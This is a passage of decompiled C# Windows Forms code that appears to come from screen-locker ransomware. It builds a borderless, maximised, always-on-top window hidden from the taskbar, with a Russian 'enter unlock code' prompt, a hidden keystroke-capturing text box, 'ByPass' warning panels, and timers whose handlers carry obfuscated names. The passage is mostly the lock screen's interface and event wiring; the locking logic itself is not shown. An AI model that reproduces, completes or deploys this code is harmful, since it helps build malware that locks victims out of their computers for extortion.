			this.border_3.TabStop = false;
			this.inputPS.BackColor = Color.White;
			this.inputPS.Font = new Font("Lucida Console", 15.75f);
			this.inputPS.ForeColor = Color.Black;
			this.inputPS.Location = new Point(8, 29);
			this.inputPS.Name = "inputPS";
			this.inputPS.Size = new Size(797, 25);
			this.inputPS.TabIndex = 5;
			this.inputPS.Text = " ";
			this.inputPS.TextAlign = ContentAlignment.MiddleCenter;
			this.keytext.Font = new Font("Lucida Console", 15.75f);
			this.keytext.Location = new Point(3, 6);
			this.keytext.Name = "keytext";
			this.keytext.Size = new Size(807, 24);
			this.keytext.TabIndex = 4;
			this.keytext.Text = "Введите код разблокировки:";
			this.keytext.TextAlign = ContentAlignment.TopCenter;
			this.hdn.Location = new Point(-17, 4);
			this.hdn.MaxLength = 45;
			this.hdn.Name = "hdn";
			this.hdn.Size = new Size(10, 22);
			this.hdn.TabIndex = 3;
			this.InstantiateParameter().Enabled = true;
			this.InstantiateParameter().Interval = 5;
			this.PatchDatabase().Enabled = true;
			this.PatchDatabase().Interval = 9;
			this.art.Dock = DockStyle.Fill;
			this.art.Font = new Font("Lucida Console", 20.25f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.art.Image = (Image)componentResourceManager.GetObject("art.Image");
			this.art.Location = new Point(0, 0);
			this.art.Name = "art";
			this.art.Size = new Size(1006, 540);
			this.art.TabIndex = 14;
			this.CalcDatabase().Interval = 40;
			this.ReadDatabase().Enabled = true;
			this.ReadDatabase().Interval = 500;
			this.AssetDatabase().Interval = 10;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Blue;
			base.ClientSize = new Size(1006, 540);
			base.Controls.Add(this.main);
			base.Controls.Add(this.art);
			this.ForeColor = Color.White;
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "_o_program";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = FormStartPosition.CenterScreen;
			base.TopMost = true;
			base.WindowState = FormWindowState.Maximized;
			this.a1.ResumeLayout(false);
			((ISupportInitialize)this.border_6).EndInit();
			((ISupportInitialize)this.border_5).EndInit();
			((ISupportInitialize)this.border_2).EndInit();
			((ISupportInitialize)this.border_1).EndInit();
			this.main.ResumeLayout(false);
			this.main.PerformLayout();
			this.ByPassMessage.ResumeLayout(false);
			((ISupportInitialize)this.c3).EndInit();
			((ISupportInitialize)this.c2).EndInit();
			((ISupportInitialize)this.c4).EndInit();
			((ISupportInitialize)this.c1).EndInit();
			((ISupportInitialize)this.Safe1).EndInit();
			((ISupportInitialize)this.Safe2).EndInit();
			this.a2.ResumeLayout(false);
			((ISupportInitialize)this.border_8).EndInit();
			((ISupportInitialize)this.border_7).EndInit();
			((ISupportInitialize)this.border_4).EndInit();
			((ISupportInitialize)this.border_3).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000059 RID: 89 RVA: 0x0000232B File Offset: 0x0000052B
		// (set) Token: 0x0600005A RID: 90 RVA: 0x000070F0 File Offset: 0x000052F0
		internal virtual Label g1 { get; set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x0600005B RID: 91 RVA: 0x00002333 File Offset: 0x00000533
		// (set) Token: 0x0600005C RID: 92 RVA: 0x00007104 File Offset: 0x00005304
		internal virtual Panel a1 { get; set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600005D RID: 93 RVA: 0x0000233B File Offset: 0x0000053B
		// (set) Token: 0x0600005E RID: 94 RVA: 0x00007118 File Offset: 0x00005318
		internal virtual Panel main { get; set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600005F RID: 95 RVA: 0x00002343 File Offset: 0x00000543
		// (set) Token: 0x06000060 RID: 96 RVA: 0x0000712C File Offset: 0x0000532C
		internal virtual Panel a2 { get; set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000061 RID: 97 RVA: 0x0000234B File Offset: 0x0000054B
		// (set) Token: 0x06000062 RID: 98 RVA: 0x00007140 File Offset: 0x00005340
		internal virtual Label keytext { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000063 RID: 99 RVA: 0x00002353 File Offset: 0x00000553
		// (set) Token: 0x06000064 RID: 100 RVA: 0x00007154 File Offset: 0x00005354
		internal virtual TextBox hdn
		{
			[System.Runtime.CompilerServices.CompilerGenerated]
			get
			{
				return this.container;
			}
			[System.Runtime.CompilerServices.CompilerGenerated]
			set
			{
				KeyEventHandler keyEventHandler = new KeyEventHandler(this.DestroySingleton);
				KeyPressEventHandler keyPressEventHandler = new KeyPressEventHandler(this.GetSingleton);
				KeyEventHandler keyEventHandler2 = new KeyEventHandler(this.ReadSingleton);
				TextBox textBox = this.container;
				if (textBox != null)
				{
					textBox.KeyDown -= keyEventHandler;
					textBox.KeyPress -= keyPressEventHandler;
					textBox.KeyUp -= keyEventHandler2;
				}
				this.container = value;
				textBox = this.container;
				if (textBox != null)
				{
					textBox.KeyDown += keyEventHandler;
					textBox.KeyPress += keyPressEventHandler;
					textBox.KeyUp += keyEventHandler2;
				}
			}
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000065 RID: 101 RVA: 0x0000235B File Offset: 0x0000055B
		// (set) Token: 0x06000066 RID: 102 RVA: 0x000071E0 File Offset: 0x000053E0
		internal virtual Label inputPS
		{
			[System.Runtime.CompilerServices.CompilerGenerated]
			get
			{
				return this.m_Thread;
			}
			[System.Runtime.CompilerServices.CompilerGenerated]
			set
			{
				System.EventHandler eventHandler = new System.EventHandler(this.RegisterSingleton);
				Label thread = this.m_Thread;
				if (thread != null)
				{
					thread.Click -= eventHandler;
				}
				this.m_Thread = value;
				thread = this.m_Thread;
				if (thread != null)
				{
					thread.Click += eventHandler;
				}
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00002363 File Offset: 0x00000563
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual System.Windows.Forms.Timer InstantiateParameter()
		{
			return this.m_Error;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x0000722C File Offset: 0x0000542C
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual void OrderParameter(System.Windows.Forms.Timer ident)
		{
			System.EventHandler eventHandler = new System.EventHandler(this.FlushSingleton);
			System.Windows.Forms.Timer error = this.m_Error;
			if (error != null)
			{
				error.Tick -= eventHandler;
			}
			this.m_Error = ident;
			error = this.m_Error;
			if (error != null)
			{
				error.Tick += eventHandler;
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000069 RID: 105 RVA: 0x0000236B File Offset: 0x0000056B
		// (set) Token: 0x0600006A RID: 106 RVA: 0x00007278 File Offset: 0x00005478
		internal virtual PictureBox border_6 { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x0600006B RID: 107 RVA: 0x00002373 File Offset: 0x00000573
		// (set) Token: 0x0600006C RID: 108 RVA: 0x0000728C File Offset: 0x0000548C
		internal virtual PictureBox border_5 { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x0600006D RID: 109 RVA: 0x0000237B File Offset: 0x0000057B
		// (set) Token: 0x0600006E RID: 110 RVA: 0x000072A0 File Offset: 0x000054A0
		internal virtual PictureBox border_2 { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x0600006F RID: 111 RVA: 0x00002383 File Offset: 0x00000583
		// (set) Token: 0x06000070 RID: 112 RVA: 0x000072B4 File Offset: 0x000054B4
		internal virtual PictureBox border_1 { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000071 RID: 113 RVA: 0x0000238B File Offset: 0x0000058B
		// (set) Token: 0x06000072 RID: 114 RVA: 0x000072C8 File Offset: 0x000054C8
		internal virtual PictureBox border_8 { get; set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000073 RID: 115 RVA: 0x00002393 File Offset: 0x00000593
		// (set) Token: 0x06000074 RID: 116 RVA: 0x000072DC File Offset: 0x000054DC
		internal virtual PictureBox border_7 { get; set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000075 RID: 117 RVA: 0x0000239B File Offset: 0x0000059B
		// (set) Token: 0x06000076 RID: 118 RVA: 0x000072F0 File Offset: 0x000054F0
		internal virtual PictureBox border_4 { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000077 RID: 119 RVA: 0x000023A3 File Offset: 0x000005A3
		// (set) Token: 0x06000078 RID: 120 RVA: 0x00007304 File Offset: 0x00005504
		internal virtual PictureBox border_3 { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000079 RID: 121 RVA: 0x000023AB File Offset: 0x000005AB
		// (set) Token: 0x0600007A RID: 122 RVA: 0x00007318 File Offset: 0x00005518
		internal virtual Label s2 { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x0600007B RID: 123 RVA: 0x000023B3 File Offset: 0x000005B3
		// (set) Token: 0x0600007C RID: 124 RVA: 0x0000732C File Offset: 0x0000552C
		internal virtual Label tg { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x0600007D RID: 125 RVA: 0x000023BB File Offset: 0x000005BB
		// (set) Token: 0x0600007E RID: 126 RVA: 0x00007340 File Offset: 0x00005540
		internal virtual Label s1 { get; set; }

		// Token: 0x0600007F RID: 127 RVA: 0x000023C3 File Offset: 0x000005C3
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual System.Windows.Forms.Timer PatchDatabase()
		{
			return this._Decorator;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00007354 File Offset: 0x00005554
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual void ForgotDatabase(System.Windows.Forms.Timer ident)
		{
			System.EventHandler eventHandler = new System.EventHandler(this.PopSingleton);
			System.Windows.Forms.Timer decorator = this._Decorator;
			if (decorator != null)
			{
				decorator.Tick -= eventHandler;
			}
			this._Decorator = ident;
			decorator = this._Decorator;
			if (decorator != null)
			{
				decorator.Tick += eventHandler;
			}
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000081 RID: 129 RVA: 0x000023CB File Offset: 0x000005CB
		// (set) Token: 0x06000082 RID: 130 RVA: 0x000073A0 File Offset: 0x000055A0
		internal virtual Label menu1 { get; set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x06000083 RID: 131 RVA: 0x000023D3 File Offset: 0x000005D3
		// (set) Token: 0x06000084 RID: 132 RVA: 0x000073B4 File Offset: 0x000055B4
		internal virtual Label Title { get; set; }

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x06000085 RID: 133 RVA: 0x000023DB File Offset: 0x000005DB
		// (set) Token: 0x06000086 RID: 134 RVA: 0x000073C8 File Offset: 0x000055C8
		internal virtual Label art { get; set; }

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000087 RID: 135 RVA: 0x000023E3 File Offset: 0x000005E3
		// (set) Token: 0x06000088 RID: 136 RVA: 0x000073DC File Offset: 0x000055DC
		internal virtual Label errx { get; set; }

		// Token: 0x06000089 RID: 137 RVA: 0x000023EB File Offset: 0x000005EB
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual System.Windows.Forms.Timer CalcDatabase()
		{
			return this._Registry;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000073F0 File Offset: 0x000055F0
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual void DestroyDatabase(System.Windows.Forms.Timer v)
		{
			System.EventHandler eventHandler = new System.EventHandler(this.StartSingleton);
			System.Windows.Forms.Timer registry = this._Registry;
			if (registry != null)
			{
				registry.Tick -= eventHandler;
			}
			this._Registry = v;
			registry = this._Registry;
			if (registry != null)
			{
				registry.Tick += eventHandler;
			}
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x0600008B RID: 139 RVA: 0x000023F3 File Offset: 0x000005F3
		// (set) Token: 0x0600008C RID: 140 RVA: 0x0000743C File Offset: 0x0000563C
		internal virtual Label UserInfo { get; set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x0600008D RID: 141 RVA: 0x000023FB File Offset: 0x000005FB
		// (set) Token: 0x0600008E RID: 142 RVA: 0x00007450 File Offset: 0x00005650
		internal virtual Label ID { get; set; }

		// Token: 0x0600008F RID: 143 RVA: 0x00002403 File Offset: 0x00000603
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual System.Windows.Forms.Timer ReadDatabase()
		{
			return this.m_Creator;
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00007464 File Offset: 0x00005664
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual void ExcludeDatabase(System.Windows.Forms.Timer setup)
		{
			System.EventHandler eventHandler = new System.EventHandler(this.ResolveSingleton);
			System.Windows.Forms.Timer creator = this.m_Creator;
			if (creator != null)
			{
				creator.Tick -= eventHandler;
			}
			this.m_Creator = setup;
			creator = this.m_Creator;
			if (creator != null)
			{
				creator.Tick += eventHandler;
			}
		}

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000091 RID: 145 RVA: 0x0000240B File Offset: 0x0000060B
		// (set) Token: 0x06000092 RID: 146 RVA: 0x000074B0 File Offset: 0x000056B0
		internal virtual PictureBox Safe1 { get; set; }

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000093 RID: 147 RVA: 0x00002413 File Offset: 0x00000613
		// (set) Token: 0x06000094 RID: 148 RVA: 0x000074C4 File Offset: 0x000056C4
		internal virtual PictureBox Safe2 { get; set; }

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000095 RID: 149 RVA: 0x0000241B File Offset: 0x0000061B
		// (set) Token: 0x06000096 RID: 150 RVA: 0x000074D8 File Offset: 0x000056D8
		internal virtual Panel ByPassMessage { get; set; }

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000097 RID: 151 RVA: 0x00002423 File Offset: 0x00000623
		// (set) Token: 0x06000098 RID: 152 RVA: 0x000074EC File Offset: 0x000056EC
		internal virtual PictureBox c3 { get; set; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000099 RID: 153 RVA: 0x0000242B File Offset: 0x0000062B
		// (set) Token: 0x0600009A RID: 154 RVA: 0x00007500 File Offset: 0x00005700
		internal virtual PictureBox c2 { get; set; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x0600009B RID: 155 RVA: 0x00002433 File Offset: 0x00000633
		// (set) Token: 0x0600009C RID: 156 RVA: 0x00007514 File Offset: 0x00005714
		internal virtual PictureBox c4 { get; set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x0600009D RID: 157 RVA: 0x0000243B File Offset: 0x0000063B
		// (set) Token: 0x0600009E RID: 158 RVA: 0x00007528 File Offset: 0x00005728
		internal virtual PictureBox c1 { get; set; }

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x0600009F RID: 159 RVA: 0x00002443 File Offset: 0x00000643
		// (set) Token: 0x060000A0 RID: 160 RVA: 0x0000753C File Offset: 0x0000573C
		internal virtual Label ByPassWarnMsg { get; set; }

		// Token: 0x060000A1 RID: 161 RVA: 0x0000244B File Offset: 0x0000064B
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual System.Windows.Forms.Timer AssetDatabase()
		{
			return this.producer;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00007550 File Offset: 0x00005750
		[System.Runtime.CompilerServices.CompilerGenerated]
		internal virtual void NewDatabase(System.Windows.Forms.Timer def)
		{
			System.EventHandler eventHandler = new System.EventHandler(this.InterruptSingleton);
			System.Windows.Forms.Timer timer = this.producer;
			if (timer != null)
			{
				timer.Tick -= eventHandler;
			}
			this.producer = def;
			timer = this.producer;
			if (timer != null)
			{
				timer.Tick += eventHandler;
			}
		}

		// Token: 0x04000019 RID: 25
		public string config;

		// Token: 0x0400001A RID: 26
		private object m_Token;

		// Token: 0x0400001B RID: 27
		private object param;

		// Token: 0x0400001C RID: 28
		private object m_Mock;

		// Token: 0x0400001D RID: 29
		private object expression;

		// Token: 0x0400001E RID: 30
		private object helper;

		// Token: 0x04000020 RID: 32
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("g1")]
		private Label m_Listener;

		// Token: 0x04000021 RID: 33
		[System.Runtime.CompilerServices.AccessedThroughProperty("a1")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Panel _Item;

		// Token: 0x04000022 RID: 34
		[System.Runtime.CompilerServices.AccessedThroughProperty("main")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Panel m_Template;

		// Token: 0x04000023 RID: 35
		[System.Runtime.CompilerServices.AccessedThroughProperty("a2")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Panel m_Setter;

		// Token: 0x04000024 RID: 36
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("keytext")]
		private Label composer;

		// Token: 0x04000025 RID: 37
		[System.Runtime.CompilerServices.AccessedThroughProperty("hdn")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private TextBox container;

		// Token: 0x04000026 RID: 38
		[System.Runtime.CompilerServices.AccessedThroughProperty("inputPS")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label m_Thread;

		// Token: 0x04000027 RID: 39
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("srv")]
		private System.Windows.Forms.Timer m_Error;

		// Token: 0x04000028 RID: 40
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_6")]
		private PictureBox _Request;

		// Token: 0x04000029 RID: 41
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_5")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private PictureBox m_Method;

		// Token: 0x0400002A RID: 42
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_2")]
		private PictureBox _Collection;

		// Token: 0x0400002B RID: 43
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_1")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private PictureBox message;

		// Token: 0x0400002C RID: 44
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_8")]
		private PictureBox broadcaster;

		// Token: 0x0400002D RID: 45
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_7")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private PictureBox watcher;

		// Token: 0x0400002E RID: 46
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_4")]
		private PictureBox info;

		// Token: 0x0400002F RID: 47
		[System.Runtime.CompilerServices.AccessedThroughProperty("border_3")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private PictureBox filter;

		// Token: 0x04000030 RID: 48
		[System.Runtime.CompilerServices.AccessedThroughProperty("s2")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label tests;

		// Token: 0x04000031 RID: 49
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("tg")]
		private Label _Server;

		// Token: 0x04000032 RID: 50
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("s1")]
		private Label indexer;

		// Token: 0x04000033 RID: 51
		[System.Runtime.CompilerServices.AccessedThroughProperty("cursorstylec")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private System.Windows.Forms.Timer _Decorator;

		// Token: 0x04000034 RID: 52
		[System.Runtime.CompilerServices.AccessedThroughProperty("menu1")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label _Processor;

		// Token: 0x04000035 RID: 53
		[System.Runtime.CompilerServices.AccessedThroughProperty("Title")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label reponse;

		// Token: 0x04000036 RID: 54
		[System.Runtime.CompilerServices.AccessedThroughProperty("art")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label _Context;

		// Token: 0x04000037 RID: 55
		[System.Runtime.CompilerServices.AccessedThroughProperty("errx")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label _Wrapper;

		// Token: 0x04000038 RID: 56
		[System.Runtime.CompilerServices.AccessedThroughProperty("OnError")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private System.Windows.Forms.Timer _Registry;

		// Token: 0x04000039 RID: 57
		[System.Runtime.CompilerServices.AccessedThroughProperty("UserInfo")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label code;

		// Token: 0x0400003A RID: 58
		[System.Runtime.CompilerServices.AccessedThroughProperty("ID")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Label _Comparator;

		// Token: 0x0400003B RID: 59
		[System.Runtime.CompilerServices.AccessedThroughProperty("clck")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private System.Windows.Forms.Timer m_Creator;

		// Token: 0x0400003C RID: 60
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("Safe1")]
		private PictureBox m_Interceptor;

		// Token: 0x0400003D RID: 61
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("Safe2")]
		private PictureBox _Candidate;

		// Token: 0x0400003E RID: 62
		[System.Runtime.CompilerServices.AccessedThroughProperty("ByPassMessage")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private Panel _Process;

		// Token: 0x0400003F RID: 63
		[System.Runtime.CompilerServices.AccessedThroughProperty("c3")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private PictureBox m_Event;

		// Token: 0x04000040 RID: 64
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("c2")]
		private PictureBox m_Exporter;

		// Token: 0x04000041 RID: 65
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("c4")]
		private PictureBox value;

		// Token: 0x04000042 RID: 66
		[System.Runtime.CompilerServices.AccessedThroughProperty("c1")]
		[System.Runtime.CompilerServices.CompilerGenerated]
		private PictureBox m_Dic;

		// Token: 0x04000043 RID: 67
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("ByPassWarnMsg")]
		private Label _Status;

		// Token: 0x04000044 RID: 68
		[System.Runtime.CompilerServices.CompilerGenerated]
		[System.Runtime.CompilerServices.AccessedThroughProperty("bypasserr")]
		private System.Windows.Forms.Timer producer;
	}
}
